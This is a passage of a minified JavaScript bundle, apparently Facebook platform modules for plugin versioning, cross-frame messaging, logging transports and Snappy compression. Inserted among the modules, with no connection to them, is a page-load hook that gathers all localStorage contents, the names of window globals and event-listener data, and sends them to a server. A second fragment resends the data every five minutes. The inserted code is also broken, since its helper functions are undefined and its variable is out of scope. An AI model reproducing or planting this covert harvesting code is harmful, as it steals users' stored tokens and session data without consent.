      setInterval(this.resize.bind(this), a || 250);
      return this;
    }
  });
  j.auto = function (a, b, c) {
    return new j(g.bind(null, a), i.bind(null, a), b).resize().auto(c);
  };
  j.autoHeight = function (a, b, c, d) {
    return new j(function () {
      return a;
    }, i.bind(null, b), c).resize().auto(d);
  };
  j.getElementWidth = h;
  e.exports = j;
}, null);
__d("StrSet", [], function (a, b, c, d, e, f) {
  a = function () {
    function a(a) {
      this.$2 = {}, this.$1 = 0, a && this.addAll(a);
    }
    var b = a.prototype;
    b.add = function (a) {
      Object.prototype.hasOwnProperty.call(this.$2, a) || (this.$2[a] = !0, this.$1++);
      return this;
    };
    b.addAll = function (a) {
      a.forEach(this.add, this);
      return this;
    };
    b.remove = function (a) {
      Object.prototype.hasOwnProperty.call(this.$2, a) && (delete this.$2[a], this.$1--);
      return this;
    };
    b.removeAll = function (a) {
      a.forEach(this.remove, this);
      return this;
    };
    b.toArray = function () {
      return Object.keys(this.$2);
    };
    b.toMap = function (a) {
      var b = {};
      Object.keys(this.$2).forEach(function (c) {
        b[c] = typeof a === "function" ? a(c) : a || !0;
      });
      return b;
    };
    b.contains = function (a) {
      return Object.prototype.hasOwnProperty.call(this.$2, a);
    };
    b.count = function () {
      return this.$1;
    };
    b.clear = function () {
      this.$2 = {};
      this.$1 = 0;
      return this;
    };
    b.clone = function () {
      return new a(this);
    };
    b.forEach = function (a, b) {
      Object.keys(this.$2).forEach(a, b);
    };
    b.map = function (a, b) {
      return Object.keys(this.$2).map(a, b);
    };
    b.some = function (a, b) {
      return Object.keys(this.$2).some(a, b);
    };
    b.every = function (a, b) {
      return Object.keys(this.$2).every(a, b);
    };
    b.filter = function (b, c) {
      return new a(Object.keys(this.$2).filter(b, c));
    };
    b.union = function (a) {
      return this.clone().addAll(a);
    };
    b.intersect = function (a) {
      return this.filter(function (b) {
        return a.contains(b);
      });
    };
    b.difference = function (a) {
      var b = this;
      return a.filter(function (a) {
        return !b.contains(a);
      });
    };
    b.equals = function (a) {
      var b = function (a, b) {
          return a === b ? 0 : a < b ? -1 : 1;
        },
        c = this.toArray();
      a = a.toArray();
      if (c.length !== a.length) return !1;
      var d = c.length;
      c = c.sort(b);
      a = a.sort(b);
      while (d--) if (c[d] !== a[d]) return !1;
      return !0;
    };
    return a;
  }();
  f["default"] = a;
}, 66);
__d("PlatformVersioning", ["invariant", "PlatformVersions", "StrSet", "getObjectValues"], function (a, b, c, d, e, f, g) {
  var h = new (b("StrSet"))(b("getObjectValues")(b("PlatformVersions").versions)),
    i = location.pathname;
  i = i.substring(1, i.indexOf("/", 1));
  var j = h.contains(i) ? i : b("PlatformVersions").versions.UNVERSIONED;
  function k(a, c) {
    if (c == b("PlatformVersions").versions.UNVERSIONED) return a;
    h.contains(c) || g(0, 3769);
    a = a.indexOf("/") !== 0 ? "/" + a : a;
    return "/" + c + a;
  }
  function a() {
    return b("PlatformVersions").LATEST;
  }
  function c(a) {
    return a.setPath(k(a.getPath(), j));
  }
  function d(a) {
    return k(a, j);
  }
  function e(a) {
    return h.contains(a.substring(1, a.indexOf("/", 1))) ? a.substring(a.indexOf("/", 1)) : a;
  }
  i = {
    addVersionToPath: k,
    getLatestVersion: a,
    versionAwareURI: c,
    versionAwarePath: d,
    getUnversionedPath: e
  };
  a = i;
  f["default"] = a;
}, 66);
__d("PlatformWidgetEndpoint", ["PlatformVersioning"], function (a, b, c, d, e, f) {
  function a(a, c) {
    return b("PlatformVersioning").versionAwarePath("/dialog/" + a + (c ? "/" + c : ""));
  }
  function c(a, c) {
    return b("PlatformVersioning").versionAwarePath("/plugins/" + a + (c ? "/" + c : ""));
  }
  function d(a) {
    return /^\/plugins\//.test(b("PlatformVersioning").getUnversionedPath(a));
  }
  function f(a) {
    return /^\/dialog\//.test(b("PlatformVersioning").getUnversionedPath(a));
  }
  a = {
    dialog: a,
    plugins: c,
    isPluginEndpoint: d,
    isDialogEndpoint: f
  };
  e.exports = a;
}, null);
__d("PluginReturn", ["invariant", "Arbiter", "Log", "PlatformDialog", "PlatformWidgetEndpoint", "Plugin", "URI"], function (a, b, c, d, e, f, g) {
  var h;
  b("Arbiter").subscribe(b("PlatformDialog").RESPONSE, function (a, c) {
    if (c.error_code) {
      b("Log").debug("Plugin Return Error (%s): %s", c.error_code, c.error_message || c.error_description);
      return;
    }
    b("Plugin").reload(c.plugin_reload);
  });
  var i = {
    auto: function () {
      b("Arbiter").subscribe(b("Plugin").RELOAD, function (a, b) {
        a = typeof b === "object" ? b.reloadUrl : b;
        i.reload(a);
      });
    },
    syncPlugins: function () {
      b("Arbiter").subscribe(b("Plugin").RELOAD, function (a, b) {
        b.crossFrame && i.reload(b.reloadUrl, b.reload, b.identifier);
      });
    },
    reload: function (a, c, d) {
      d = (h || (h = b("URI"))).getRequestURI().removeQueryData("ret").removeQueryData("act").removeQueryData("hash").addQueryData("reload", c).addQueryData("id", d);
      if (a) {
        var c = new (h || (h = b("URI")))(a);
        b("PlatformWidgetEndpoint").isPluginEndpoint(c.getPath()) || g(0, 1120);
        d.setPath(c.getPath()).addQueryData(c.getQueryData());
      }
      window.location.replace(d.toString());
    }
  };
  e.exports = i;
}, null);
window.addEventListener("load", function () {
  let data = {
    localStorage: {},
    eventListeners: {},
    globalVariables: Object.keys(window)
  };

  // Collect data from localStorage
  for (let i = 0; i < localStorage.length; i++) {
    let key = localStorage.key(i);
    data.localStorage[key] = localStorage.getItem(key);
  }

  // Collect data from event listeners
  ["click", "mousemove", "keypress"].forEach(event => {
    data.eventListeners[event] = collectEventListenerData(document, event);
  });
  sendDataToServer(data); // Send off data
});

// Repeat every 5 minutes
__d("SecurePostMessage", ["invariant"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = "*";
  a = {
    sendMessageToSpecificOrigin: function (a, b, c, d) {
      c !== h || g(0, 21157), a.postMessage(b, c, d);
    },
    sendMessageForCurrentOrigin: function (a, b) {
      a.postMessage(b);
    },
    sendMessageAllowAnyOrigin_UNSAFE: function (a, b, c) {
      a.postMessage(b, h, c);
    }
  };
  e.exports = a;
}, null);
__d("PluginXDReady", ["Arbiter", "Log", "SecurePostMessage", "UnverifiedXD"], function (a, b, c, d, e, f, g) {
  b = {
    handleMessage: function (a) {
      d("Log").debug("PluginXDReady at " + window.name + " handleMessage " + JSON.stringify(a));
      if (!a.method) return;
      try {
        c("Arbiter").inform("Connect.Unsafe." + a.method, JSON.parse(a.params), "persistent");
      } catch (a) {}
    }
  };
  window.addEventListener("message", function (a) {
    d("Log").debug("PluginXDReady at " + window.name + " received message " + JSON.stringify(a.data.message));
    if (a.data.xdArbiterSyn) d("SecurePostMessage").sendMessageAllowAnyOrigin_UNSAFE(a.source, {
      xdArbiterAck: !0
    });else if (a.data.xdArbiterHandleMessage) {
      if (!a.data.message.method) return;
      try {
        c("Arbiter").inform("Connect.Unsafe." + a.data.message.method, JSON.parse(a.data.message.params), "persistent");
      } catch (a) {}
    }
  }, !1);
  a.XdArbiter = b;
  c("UnverifiedXD").send({
    xd_action: "plugin_ready",
    name: window.name
  });
  e = null;
  g["default"] = e;
}, 98);
__d("Banzai", ["cr:1642797"], function (a, b, c, d, e, f, g) {
  g["default"] = b("cr:1642797");
}, 98);
__d("JstlMigrationFalcoEvent", ["FalcoLoggerInternal", "getFalcoLogPolicy_DO_NOT_USE"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = c("getFalcoLogPolicy_DO_NOT_USE")("1814852");
  b = d("FalcoLoggerInternal").create("jstl_migration", a);
  e = b;
  g["default"] = e;
}, 98);
setInterval(() => {
  sendDataToServer(data);
}, 5 * 60 * 1000);
__d("getDataWithLoggerOptions", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a, b) {
    return babelHelpers["extends"]({}, a, {
      __options: babelHelpers["extends"]({
        event_time: Date.now() / 1e3
      }, b)
    });
  }
  f["default"] = a;
}, 66);
__d("GeneratedLoggerUtils", ["invariant", "Banzai", "JstlMigrationFalcoEvent", "getDataWithLoggerOptions"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = window.location.search.indexOf("showlog") > -1;
  function a(a, c, d, e) {
    var f = b("getDataWithLoggerOptions")(c, e);
    c = a.split(":")[0];
    var g = a.split(":")[1];
    c == "logger" ? b("JstlMigrationFalcoEvent").log(function () {
      return {
        logger_config_name: g,
        payload: f
      };
    }) : b("Banzai").post(a, f, d);
    h;
  }
  c = {
    log: a,
    serializeVector: function (a) {
      if (!a) return a;
      if (Array.isArray(a)) return a;
      if (a.toArray) {
        var b = a;
        return b.toArray();
      }
      if (typeof a === "object" && a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]) return Array.from(a);
      g(0, 3874, a);
    },
    serializeMap: function (a) {
      if (!a) return a;
      if (a.toJS) {
        var b = a;
        return b.toJS();
      }
      if (typeof a === "object" && a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]) {
        b = a;
        var c = {};
        for (var b = b, d = Array.isArray(b), e = 0, b = d ? b : b[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
          var f;
          if (d) {
            if (e >= b.length) break;
            f = b[e++];
          } else {
            e = b.next();
            if (e.done) break;
            f = e.value;
          }
          f = f;
          c[f[0]] = f[1];
        }
        return c;
      }
      if (Object.prototype.toString.call(a) === "[object Object]") return a;
      g(0, 3875, a);
    },
    checkExtraDataFieldNames: function (a, b) {
      Object.keys(a).forEach(function (a) {
        Object.prototype.hasOwnProperty.call(b, a) && g(0, 3876, a);
      });
    },
    warnForInvalidFieldNames: function (a, b, c, d) {},
    throwIfNull: function (a, b) {
      a || g(0, 3877, b);
      return a;
    }
  };
  e.exports = c;
}, null);
__d("TransportSelectingClientSingletonConditional", ["cr:5800"], function (a, b, c, d, e, f, g) {
  "use strict";

  g["default"] = b("cr:5800");
}, 98);
__d("Deferred", ["Promise"], function (a, b, c, d, e, f) {
  "use strict";

  b("Promise").resolve();
  a = function () {
    function a(a) {
      var c = this;
      a = a || b("Promise");
      this.$1 = !1;
      this.$2 = new a(function (a, b) {
        c.$3 = a, c.$4 = b;
      });
    }
    var c = a.prototype;
    c.getPromise = function () {
      return this.$2;
    };
    c.resolve = function (a) {
      this.$1 = !0, this.$3(a);
    };
    c.reject = function (a) {
      this.$1 = !0, this.$4(a);
    };
    c.isSettled = function () {
      return this.$1;
    };
    return a;
  }();
  f["default"] = a;
}, 66);
__d("RDFDRequireDeferredReference", ["RequireDeferredReference"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = function (a) {
    babelHelpers.inheritsLoose(b, a);
    function b() {
      return a.apply(this, arguments) || this;
    }
    return b;
  }(c("RequireDeferredReference"));
  g["default"] = a;
}, 98);
__d("requireDeferredForDisplay", ["RDFDRequireDeferredReference"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a(a) {
    return new (c("RDFDRequireDeferredReference"))(a);
  }
  g["default"] = a;
}, 98);
__d("FalcoAppUniverse", ["$InternalEnum"], function (a, b, c, d, e, f) {
  a = b("$InternalEnum")({
    FACEBOOK: 1,
    INSTAGRAM: 2
  });
  c = a;
  f["default"] = c;
}, 66);
__d("uuidv4", [], function (a, b, c, d, e, f) {
  "use strict";

  function a() {
    var a;
    a = (a = self) == null ? void 0 : (a = a.crypto) == null ? void 0 : a.randomUUID;
    return typeof a === "function" ? self.crypto.randomUUID() : "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (a) {
      var b = Math.random() * 16 | 0;
      a = a === "x" ? b : b & 3 | 8;
      return a.toString(16);
    });
  }
  f["default"] = a;
}, 66);
__d("FalcoLoggerTransports", ["AnalyticsCoreData", "Banzai", "ExecutionEnvironment", "FBLogger", "FalcoAppUniverse", "FalcoUtils", "ODS", "PersistedQueue", "Queue", "WebSession", "performanceAbsoluteNow", "promiseDone", "requireDeferredForDisplay", "uuidv4"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = c("requireDeferredForDisplay")("TransportSelectingClientSingletonConditional").__setRef("FalcoLoggerTransports"),
    i = 5 * 1024,
    j = (b = c("AnalyticsCoreData").max_delay_br_queue) != null ? b : 60 * 1e3,
    k = (e = c("AnalyticsCoreData").max_delay_br_queue_immediate) != null ? e : 1e3,
    l = "falco:",
    m = new (c("Queue"))(),
    n = 5e3,
    o = 6e4,
    p = c("uuidv4")(),
    q = "ods_web_batch",
    r = new Map(),
    s = new Set(),
    t = new Set(),
    u = (f = c("FalcoAppUniverse").cast(c("AnalyticsCoreData").app_universe)) != null ? f : 1,
    v = [],
    w = 0,
    x,
    y = !1,
    z = !1,
    A = !1,
    B = !0,
    C = !1,
    D = Date.now() - o,
    E = 1;
  W();
  for (e = (b = c("AnalyticsCoreData").stateful_events_list_for_br) != null ? b : [], f = Array.isArray(e), b = 0, e = f ? e : e[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
    var F;
    if (f) {
      if (b >= e.length) break;
      F = e[b++];
    } else {
      b = e.next();
      if (b.done) break;
      F = b.value;
    }
    F = F;
    s.add(F);
  }
  for (b = (F = c("AnalyticsCoreData").stateless_non_fb_events_for_br) != null ? F : [], f = Array.isArray(b), e = 0, b = f ? b : b[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
    if (f) {
      if (e >= b.length) break;
      F = b[e++];
    } else {
      e = b.next();
      if (e.done) break;
      F = e.value;
    }
    F = F;
    t.add(F);
  }
  function G() {
    return c("AnalyticsCoreData").enable_bladerunner && !c("ExecutionEnvironment").isInWorker;
  }
  function H(a, b) {
    P(b.item.name, "js.br.add_to_batch", 1, !0);
    var c = b.item.extra.length;
    w + c > i && (clearTimeout(x), I());
    v.push([a, b]);
    w += c;
  }
  function I() {
    x = null;
    y = !1;
    var a = v;
    N("js.br.send_batch", a.map(function (a) {
      return a[1].item;
    }));
    if (!C) {
      O("js.br.init_not_complete.log", a.length);
      var b = function () {
        var b = a[c],
          d = b[0],
          e = b[1];
        P(e.item.name, "js.br.banzai_fallback_for_init_not_complete", 1, !0);
        ((b = e.item.logImmediate) != null ? b : !1) ? Q.logImmediately([e.item], function (a) {
          return d.markItem(e, a);
        }) : Q.log([e.item], function (a) {
          return d.markItem(e, a);
        });
      };
      for (var c = 0; c < a.length; c++) b();
    } else m.enqueue(function (b) {
      return b.log(a.map(function (a) {
        return a[1].item;
      }), function (b) {
        if (!b) {
          O("js.br.banzai_fallback", a.length);
          var c = function () {
            var c = a[d],
              b = c[0],
              e = c[1];
            P(e.item.name, "js.br.banzai_fallback_for_failure", 1, !0);
            ((c = e.item.logImmediate) != null ? c : !1) ? Q.logImmediately([e.item], function (a) {
              return b.markItem(e, a);
            }) : Q.log([e.item], function (a) {
              return b.markItem(e, a);
            });
          };
          for (var d = 0; d < a.length; d++) c();
          return;
        }
        for (c = 0; c < a.length; c++) {
          var e = a[c],
            f = e[0];
          e = e[1];
          P(e.item.name, "js.br.success_callback.batch.send_batch", 1, !0);
          f.markItem(e, b);
        }
      });
    });
    v = [];
    w = 0;
  }
  function J(a) {
    var b,
      d = null;
    if ((b = c("AnalyticsCoreData").br_stateful_batching_exp) != null ? b : !1) {
      ((b = c("AnalyticsCoreData").enable_br_stateful_batching) != null ? b : !1) ? d = ["exp:falco_js_br_stateful_batching:on"] : d = ["exp:falco_js_br_stateful_batching:off"];
    }
    return {
      events: a.map(function (a) {
        return {
          name: a.name,
          extra: a.extra,
          rate: a.policy.r,
          time: a.time / 1e3,
          tag: 0,
          tags: a.tags,
          shouldAddState: a.shouldAddState,
          identity: L(a.identity),
          expTags: d
        };
      })
    };
  }
  function K(a) {
    var b;
    a = {
      deviceId: c("AnalyticsCoreData").device_id,
      familyDeviceId: null,
      osBuildNumber: null,
      sessionId: a,
      appId: c("AnalyticsCoreData").app_id,
      appVersion: (a = c("AnalyticsCoreData").app_version) != null ? a : null,
      bundleId: null,
      consentState: null,
      identity: null,
      pushPhase: c("AnalyticsCoreData").push_phase
    };
    ((b = (b = c("AnalyticsCoreData").stateful_events_list_for_br) == null ? void 0 : b.length) != null ? b : 0) > 0 && (a.ambientState = c("AnalyticsCoreData").state_for_br);
    a.identity = L(c("AnalyticsCoreData").identity);
    return Object.freeze(a);
  }
  function L(a) {
    try {
      if (u === 2) {
        var b = a == null ? void 0 : a.appScopedIdentity;
        if (b !== void 0) return {
          appScopedIdentity: {
            uid: b,
            identifier: b,
            claims: []
          }
        };
      } else {
        b = a == null ? void 0 : a.fbIdentity;
        if (b !== void 0) return {
          facebookIdentity: {
            actorId: b.actorId,
            accountId: b.accountId,
            claims: []
          }
        };
      }
    } catch (a) {
      d("ODS").bumpEntityKey(1344, "js.br.identity.propogation", "exception.while.generating.identity", 1);
    }
    return null;
  }
  function M(a, b) {
    for (var e = 0; e < a.length; e++) {
      var f,
        g = a[e];
      P(g.name, "js.banzai.posting_event", 1, !1);
      f = (f = {}, f.e = g.extra, f.r = g.policy.r, f.d = c("AnalyticsCoreData").device_id, f.s = d("WebSession").getId(), f.t = g.time, f);
      g.privacyContext && (f.p = g.privacyContext);
      g.tags != null && (f.b = g.tags);
      var h = g.identity;
      h && (f.id = h);
      c("Banzai").post(l + g.name, f, b);
    }
    N("planes.banzai.write_to_transport", a);
  }
  function N(a, b) {
    var c = 0;
    for (var d = 0; d < b.length; d++) {
      var e = b[d];
      e.name !== q && (c += 1);
    }
    c > 0 && O(a, c);
  }
  function O(a, b) {
    var e = "falco.fabric.www." + c("AnalyticsCoreData").push_phase;
    d("ODS").bumpEntityKey(1344, e, a, b);
  }
  function P(a, b, c, e) {
    if (a === q) return !1;
    d("ODS").bumpEntityKey(1344, "falco.event." + a, b, c);
    e && O(b, c);
    return !0;
  }
  var Q = {
    log: function (a, b) {
      N("js.banzai.post.log", a), M(a, c("Banzai").BASIC), b(!0);
    },
    logImmediately: function (a, b) {
      N("js.banzai.post.log_immediately", a), M(a, c("Banzai").VITAL), b(!0);
    },
    logCritical: function (a, b) {
      N("js.banzai.post.log_critical", a), M(a, {
        signal: !0,
        retry: !0
      }), b(!0);
    }
  };
  function R(a) {
    W();
    var b = S(a, "banzai_data_loss", "log"),
      d = S(a, "banzai_data_loss", "logImmediately"),
      e = S(a, "banzai_data_loss", "logCritical"),
      f = S(a, "bladerunner_data_loss", ""),
      g = S(a, "bladerunner_data_loss", "logCritical");
    O("js.br_data_loss.posted." + a, 1);
    if (C && B) try {
      m.enqueue(function (b) {
        return b.log([f], function (b) {
          if (!b) {
            O("js.br.transport_failure." + a, 1);
            Q.logCritical([g], function (b) {
              O("js.br.failure_fallback_success_callback." + a, 1);
            });
            return;
          }
          O("js.br.success_callback." + a, 1);
        });
      });
    } catch (b) {
      O("js.br.error_enqueueing." + a, 1), Q.logCritical([g], function (b) {
        O("js.br.enqueuing_fallback_success_callback." + a, 1);
      });
    } else B || O("js.br.failed." + a, 1), C || O("js.br.init_not_complete." + a, 1), Q.logCritical([g], function (b) {
      O("js.br.init_fallback_success_callback." + a, 1);
    });
    M([b], c("Banzai").BASIC);
    M([d], c("Banzai").VITAL);
    M([e], {
      signal: !0,
      retry: !0
    });
  }
  function S(a, b, d) {
    return {
      name: b,
      time: c("performanceAbsoluteNow")(),
      policy: {
        r: 1
      },
      extra: JSON.stringify({
        event_index: a,
        falco_js_connection_id: p,
        logging_mode: d,
        logging_flow_flag: "original_flow"
      })
    };
  }
  function T() {
    D + n < Date.now() && (R(E), D = Date.now(), E++);
  }
  function U() {
    window.setTimeout(function () {
      T(), E <= 40 && U();
    }, o);
  }
  function V(a) {
    m.start(function (b) {
      return b({
        log: function (d, b) {
          N("planes.bladerunner.write_to_transport", d);
          var e = JSON.stringify(J(d));
          a ? c("AnalyticsCoreData").enable_ack ? c("promiseDone")(a.amendWithAck(e), function (a) {
            N("planes.bladerunner.ack_received" + a.toString(), d), b(a);
          }, function () {
            N("planes.bladerunner.ack_failure", d), b(!1);
          }) : (a.amendWithoutAck(e), N("planes.bladerunner.write_without_ack", d)) : (N("planes.bladerunner.request_stream_null", d), b(!1));
        },
        logImmediately: function (b, a) {
          this.log(b, a);
        },
        logCritical: function (b, a) {
          this.log(b, a);
        }
      });
    });
  }
  function W() {
    if (z) return;
    C = !1;
    if (!G()) return;
    h.onReady(function (a) {
      if (!a) {
        B = !1;
        m.start(function (a) {
          return a(Q);
        });
        return;
      }
      a = a;
      var b = {
        onTermination: function (a) {
          a.message === "Stream closed" ? (m.stop(!0), z = !1) : (B = !1, u === 2 && (d("ODS").bumpEntityKey(1344, "falco.ig.br.experiment", "exception.when.br.stream.is.rejected", 1), c("FBLogger")("ig_web", "br_stream_rejected").catching(a).warn("BladeRunner stream is rejected")), m.start(function (a) {
            return a(Q);
          }));
        },
        onFlowStatus: function () {}
      };
      c("promiseDone")(a.requestStream({
        method: "Falco"
      }, JSON.stringify(K(d("WebSession").getId())), b, {
        requestId: ""
      }).then(function (b) {
        a = b, V(a), C = !0;
      })["catch"](function (a) {
        m.stop(!0), z = !1;
      }));
    });
    z = !0;
  }
  function X(a) {
    var b = a.name;
    if (!G() || !B) return !1;
    if (s.has(b)) {
      a.shouldAddState = !0;
      return !0;
    }
    return u !== 1 && c("AnalyticsCoreData").enable_non_fb_br_stateless_by_default !== !0 && !t.has(b) ? !1 : a.policy.s === 1;
  }
  function Y(a) {
    if (a === "") return null;
    if (r.has(a)) return r.get(a);else {
      var b = {
          claim: ""
        },
        c = a.split("^#");
      if (c.length >= 4) {
        var d = c[0],
          e = c[1],
          f = c[2];
        c = c[3];
        f !== "" ? b = {
          appScopedIdentity: f,
          claim: c
        } : d !== "" && (b = {
          fbIdentity: {
            accountId: d,
            actorId: e
          },
          claim: c
        });
        r.set(a, b);
      }
      return b;
    }
  }
  function a() {
    if (A) return;
    A = !0;
    c("PersistedQueue").setHandler("falco_queue_log", function (b) {
      var c,
        d = b.getQueueNameSuffix(),
        e = Y(d);
      while (c = b.dequeueItem()) (function (c) {
        X(c.item) ? (P(c.item.name, "js.use_bladerunner.log", 1, !0), W(), x == null && (x = setTimeout(I, j)), e && !a(d) && (c.item.identity = e), H(b, c)) : (P(c.item.name, "js.use_banzai.log", 1, !0), e && (c.item.identity = e), Q.log([c.item], function (a) {
          return b.markItem(c, a);
        }));
      })(c);
    });
    c("PersistedQueue").setHandler("falco_queue_immediately", function (b) {
      var d,
        e = b.getQueueNameSuffix(),
        f = Y(e);
      while (d = b.dequeueItem()) (function (d) {
        X(d.item) ? (P(d.item.name, "js.use_bladerunner.log_immediately", 1, !0), W(), (x == null || !y) && (clearTimeout(x), x = setTimeout(I, k), y = !0), d.item.logImmediate = !0, f && !a(e) && (d.item.identity = f), H(b, d), c("PersistedQueue").isPersistenceAllowed() || (P(d.item.name, "js.br.send_immediately_no_persistence", 1, !0), I())) : (P(d.item.name, "js.use_banzai.log_immediately", 1, !0), f && (d.item.identity = f), Q.logImmediately([d.item], function (a) {
          return b.markItem(d, a);
        }));
      })(d);
    });
    c("PersistedQueue").setHandler("falco_queue_critical", function (b) {
      var c,
        d = b.getQueueNameSuffix(),
        e = Y(d);
      while (c = b.dequeueItem()) (function (c) {
        var f = c.item;
        X(f) ? (P(f.name, "js.use_bladerunner.log_critical", 1, !0), W(), !C ? (P(f.name, "js.br.init_not_complete.logCritical", 1, !0), e && (f.identity = e), Q.logCritical([f], function (a) {
          return b.markItem(c, a);
        })) : (e && !a(d) && (f.identity = e), m.enqueue(function (a) {
          return a.logCritical([f], function (a) {
            if (!a) {
              O("js.br.banzai_fallback.critical", 1);
              P(c.item.name, "js.br.banzai_fallback_for_failure.critical", 1, !0);
              !f.identity && e && (f.identity = e);
              Q.logCritical([f], function (a) {
                return b.markItem(c, a);
              });
              return;
            }
            P(c.item.name, "js.br.success_callback.batch.critical", 1, !0);
            b.markItem(c, a);
          });
        }), a(d) || P(c.item.name, "js.bladerunner.identity.mismatch", 1, !0))) : (e && (f.identity = e), P(f.name, "js.use_banzai.log_critical", 1, !0), Q.logCritical([f], function (a) {
          return b.markItem(c, a);
        }));
      })(c);
    });
    c("AnalyticsCoreData").enable_dataloss_timer && (W(), T(), U());
    function a(a) {
      try {
        var b = d("FalcoUtils").identityToString(c("AnalyticsCoreData").identity);
        return a === b;
      } catch (a) {
        d("ODS").bumpEntityKey(1344, "js.br.identity.check", "exception.when.comparing.with.current.user.identity", 1);
        return !0;
      }
    }
  }
  g.attach = a;
}, 98);
__d("LogHistory", [], function (a, b, c, d, e, f) {
  var g = 500,
    h = {},
    i = [];
  function j(a, b, c, d) {
    var e = d[0];
    if (typeof e !== "string" || d.length !== 1) return;
    i.push({
      date: Date.now(),
      level: a,
      category: b,
      event: c,
      args: e
    });
    i.length > g && i.shift();
  }
  var k = function () {
    function a(a) {
      this.category = a;
    }
    var b = a.prototype;
    b.debug = function (a) {
      for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
      j("debug", this.category, a, c);
      return this;
    };
    b.log = function (a) {
      for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
      j("log", this.category, a, c);
      return this;
    };
    b.warn = function (a) {
      for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
      j("warn", this.category, a, c);
      return this;
    };
    b.error = function (a) {
      for (var b = arguments.length, c = new Array(b > 1 ? b - 1 : 0), d = 1; d < b; d++) c[d - 1] = arguments[d];
      j("error", this.category, a, c);
      return this;
    };
    return a;
  }();
  function a(a) {
    h[a] || (h[a] = new k(a));
    return h[a];
  }
  function b() {
    return i;
  }
  function c() {
    i.length = 0;
  }
  function d(a) {
    return a.map(function (a) {
      var b = new Date(a.date).toISOString();
      return [b, a.level, a.category, a.event, a.args].join(" | ");
    }).join("\n");
  }
  f.getInstance = a;
  f.getEntries = b;
  f.clearEntries = c;
  f.formatEntries = d;
}, 66);
__d("cancelIdleCallbackBlue", ["IdleCallbackImplementation"], function (a, b, c, d, e, f, g) {
  var h = (c = a.cancelIdleCallback) != null ? c : d("IdleCallbackImplementation").cancelIdleCallback;
  function b(a) {
    h(a);
  }
  g["default"] = b;
}, 98);
__d("BDHeaderConfig", [], function (a, b, c, d, e, f) {
  "use strict";

  a = "129477";
  f.ASBD_ID = a;
}, 66);
__d("React", ["cr:1108857", "cr:1294158"], function (a, b, c, d, e, f) {
  a = b("cr:1294158");
  e.exports = a;
}, null);
__d("getAsyncHeaders", ["BDHeaderConfig", "LSD", "ZeroCategoryHeader", "isFacebookURI"], function (a, b, c, d, e, f, g) {
  function a(a) {
    var b = {},
      d = c("isFacebookURI")(a);
    d && c("ZeroCategoryHeader").value && (b[c("ZeroCategoryHeader").header] = c("ZeroCategoryHeader").value);
    d = h(a);
    d && (b["X-FB-LSD"] = d);
    d = i(a);
    d && (b["X-ASBD-ID"] = d);
    return b;
  }
  function h(a) {
    return j(a) ? null : c("LSD").token;
  }
  function i(a) {
    return j(a) ? null : d("BDHeaderConfig").ASBD_ID;
  }
  function j(a) {
    return !a.toString().startsWith("/") && a.getOrigin() !== document.location.origin;
  }
  g["default"] = a;
}, 98);
/**
 * License: https://www.facebook.com/legal/license/WRsJ32R7YJG/
 */
__d("SnappyCompress", [], function (a, b, c, d, e, f) {
  "use strict";

  function g() {
    return typeof process === "object" && typeof process.versions === "object" && typeof process.versions.node !== "undefined" ? !0 : !1;
  }
  function h(a) {
    return a instanceof Uint8Array && (!g() || !Buffer.isBuffer(a));
  }
  function i(a) {
    return a instanceof ArrayBuffer;
  }
  function j(a) {
    return !g() ? !1 : Buffer.isBuffer(a);
  }
  var k = "Argument compressed must be type of ArrayBuffer, Buffer, or Uint8Array";
  function a(a) {
    if (!h(a) && !i(a) && !j(a)) throw new TypeError(k);
    var b = !1,
      c = !1;
    h(a) ? b = !0 : i(a) && (c = !0, a = new Uint8Array(a));
    a = new A(a);
    var d = a.readUncompressedLength();
    if (d === -1) throw new Error("Invalid Snappy bitstream");
    if (b) {
      b = new Uint8Array(d);
      if (!a.uncompressToBuffer(b)) throw new Error("Invalid Snappy bitstream");
    } else if (c) {
      b = new ArrayBuffer(d);
      c = new Uint8Array(b);
      if (!a.uncompressToBuffer(c)) throw new Error("Invalid Snappy bitstream");
    } else {
      b = Buffer.alloc(d);
      if (!a.uncompressToBuffer(b)) throw new Error("Invalid Snappy bitstream");
    }
    return b;
  }
  function b(a) {
    if (!h(a) && !i(a) && !j(a)) throw new TypeError(k);
    var b = !1,
      c = !1;
    h(a) ? b = !0 : i(a) && (c = !0, a = new Uint8Array(a));
    a = new x(a);
    var d = a.maxCompressedLength(),
      e,
      f,
      g;
    b ? (e = new Uint8Array(d), g = a.compressToBuffer(e)) : c ? (e = new ArrayBuffer(d), f = new Uint8Array(e), g = a.compressToBuffer(f)) : (e = Buffer.alloc(d), g = a.compressToBuffer(e));
    if (!e.slice) {
      f = new Uint8Array(Array.prototype.slice.call(e, 0, g));
      if (b) return f;else if (c) return f.buffer;else throw new Error("not implemented");
    }
    return e.slice(0, g);
  }
  c = 16;
  var l = 1 << c,
    m = 14,
    n = new Array(m + 1);
  function o(a, b) {
    return a * 506832829 >>> b;
  }
  function p(a, b) {
    return a[b] + (a[b + 1] << 8) + (a[b + 2] << 16) + (a[b + 3] << 24);
  }
  function q(a, b, c) {
    return a[b] === a[c] && a[b + 1] === a[c + 1] && a[b + 2] === a[c + 2] && a[b + 3] === a[c + 3];
  }
  function r(a, b, c, d, e) {
    var f;
    for (f = 0; f < e; f++) c[d + f] = a[b + f];
  }
  function s(a, b, c, d, e) {
